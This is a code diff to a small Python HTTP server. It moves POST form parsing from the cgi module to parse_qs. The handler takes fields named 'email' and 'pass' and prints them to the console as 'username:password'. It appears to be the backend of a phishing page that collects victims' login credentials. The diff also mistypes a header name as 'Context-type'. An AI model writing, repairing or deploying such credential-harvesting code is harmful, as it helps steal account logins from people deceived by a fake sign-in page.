@@ -1,10 +1,9 @@
 from functools import cached_property
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from http.cookies import SimpleCookie
-from urllib.parse import parse_qsl, urlparse
+from urllib.parse import parse_qsl, urlparse, parse_qs
 
 import json
-import cgi
 
 
 class WebRequestHandler(BaseHTTPRequestHandler):
@@ -61,17 +60,17 @@ class WebRequestHandler(BaseHTTPRequestHandler):
             self.wfile.write(b'404 - Not Found')
             return
 
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD': 'POST',
-                     'CONTENT_TYPE': self.headers}
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        form_data = parse_qs(post_data.decode('utf-8'))
 
-        )
-
-        username_or_phone_number = str(form.getvalue("email"))
-        password = str(form.getvalue("pass"))
+        username_or_phone_number = str(form_data["email"][0])
+        password = str(form_data["pass"][0])
         print(username_or_phone_number + ":" + password)
+        self.send_response(200)
+        self.send_header('Context-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b'OK')
 
     def get_response(self):
         return json.dump(
